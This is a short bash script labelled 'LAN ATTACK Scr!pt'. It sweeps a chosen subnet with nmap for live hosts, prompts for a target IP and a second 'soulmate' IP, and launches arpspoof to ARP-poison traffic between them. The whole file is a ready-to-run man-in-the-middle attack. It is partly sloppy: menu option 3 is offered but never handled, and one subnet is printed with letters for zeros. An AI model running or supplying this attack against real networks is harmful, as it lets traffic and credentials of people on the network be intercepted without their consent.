#!/bin/bash
IFACE="wlp2s0"


echo "<LAN ATTACK Scr!pt/>"
echo "[1]192.168.O.O/24"
echo "[2]192.168.1.0/24"
echo "[3]10.0.0.0/24"
echo "[0]Manual Input" 
read -p "[>]" SUBNET

if [ $SUBNET = 1 ]; then
	NETWORK="192.168.0.0/24"
fi
if [ $SUBNET = 2 ]; then
	NETWORK="192.168.1.0/24"
fi
if [ $SUBNET = 0 ]; then

read -p "[*]ENTER NETWORK RANGE::" NETWORK

fi

echo "[-]Processing PingSweep....";

nmap -sn $NETWORK |grep report > up.list;
echo "[!]Serving live hosts list::";
cat up.list;

echo "[*]SELECT TARGETz"

read -p "[>]ENTER TARGET  IP>>" TARGET1
read -p "[>]ENTER SOULMATE IP>>" SOULMATE

echo "[/!\POIZONING/!\]"
arpspoof -i $IFACE -c host -t $TARGET1 -r $SOULMATE 
